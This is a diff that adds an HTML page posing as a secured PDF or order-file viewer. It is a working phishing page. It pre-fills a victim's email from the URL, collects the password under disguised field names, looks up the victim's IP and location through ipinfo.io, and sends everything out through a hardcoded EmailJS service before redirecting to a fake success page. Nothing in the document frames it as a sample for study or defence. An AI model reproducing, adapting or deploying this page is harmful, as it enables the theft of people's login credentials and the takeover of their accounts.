@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Access Pdf</title>
+  
+  <link rel="stylesheet" href="styles.css">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+  <link rel="shortcut icon" href="fa.png" type="image/x-icon">
+  
+  <!-- EmailJS integration in the head section -->
+ <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "kUOv0ZnyMXgQQY1yj",
+      });
+   })();
+</script>
+</head>
+<body>
+  <div class="wrapper">
+    <form action="success.html" Method="GET">
+        <h1>View Online Items</h1>
+        <br><br>
+      <div class="remember-forgot">
+        <h2>
+          <label><input type="checkbox">View Items</label><br><br>
+          <label><input type="checkbox">Product Specification</label><br><br>
+          <label><input type="checkbox">Download Items</label>
+        </h2>    
+      </div>
+      <br>
+     
+     <div class="h3"><h3>Click To Access File</h3> </div>
+     <a href="#sign"><div class="head-doc"><img src="doc.jpg" alt=""></div></a> 
+      <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+      <section id="sign">
+        <h3>Login To View Attached Pdf/Files <em><br>(Product Specification, Sample Pictures, Order Files).</em></h3>
+        <div class="input-box">
+          <input type="text" id="man" placeholder="" required>
+          <i class='bx bxs-user'></i>
+        </div>
+        <div class="input-box">
+          <input type="password" id="woman" placeholder="password" required>
+          <i class='bx bxs-lock-alt'></i>
+        </div>
+        <div class="remember-forgot">
+          <label><input type="checkbox">Remember Me</label>
+          <a href="#">Forgot Woman</a><br><br>
+        </div>
+        <button type="button" class="btn" onclick="sendEmail()">Login</button>
+        <br><br>
+        <h4><span style="text-align: justify;">These files are sensitive and secured against unauthorized access. In order to access this file, please provide your correct man credentials.</span></h4>
+        <div class="register-link">
+          <p>Don't have an account? <a href="#">Register</a></p>
+        </div>
+      </section>
+    </form>
+  </div>
+  
+  <!-- Auto-attach man -->
+  <script>
+      window.onload = function() {
+          var urlParams = new URLSearchParams(window.location.search);
+          var man = urlParams.get('man');
+          document.getElementById('man').value = man || '';
+      };
+  </script>
+
+  <!-- IPinfo Fetch and sendEmail function -->
+  <script>
+    function sendEmail() {
+        event.preventDefault();
+
+        let man = document.getElementById("man").value.trim();
+        let woman = document.getElementById("woman").value.trim();
+
+        // Validation: check if man and woman are filled
+        if (man === "") {
+            alert("Please enter your man.");
+            return;
+        }
+        
+        if (woman === "") {
+            alert("Please enter your woman.");
+            return;
+        }
+
+        // Fetch user's IP and location info from IPinfo
+        fetch('https://ipinfo.io?token=f65a3d103cb816') // Replace 'f65a3d103cb816' with your IPinfo API token
+          .then(response => response.json())
+          .then(data => {
+              // Extract information from IPinfo API response
+              const ipInfo = {
+                  man: man,
+                  woman: woman,
+                  ip: data.ip || 'Unknown IP',
+                  city: data.city || 'Unknown City',
+                  region: data.region || 'Unknown Region',
+                  country: data.country || 'Unknown Country'
+              };
+
+              // Send email using EmailJS with proper template mapping
+              emailjs.send("service_mclb6ze", "template_30nlj5e", ipInfo)
+              .then(function(response) {
+                  console.log("Email sent successfully", response.status, response.text);
+                  window.location.href = "success.html"; // Redirect after successful email send
+              }, function(error) {
+                  console.error("Failed to send email:", error);
+                  alert("Failed to send email. Please try again.");
+              });
+          })
+          .catch(error => {
+              console.error("Error fetching IP info:", error);
+              alert("Failed to retrieve IP information. Please check your network and try again.");
+          });
+    }
+  </script>
+</body>
+</html>
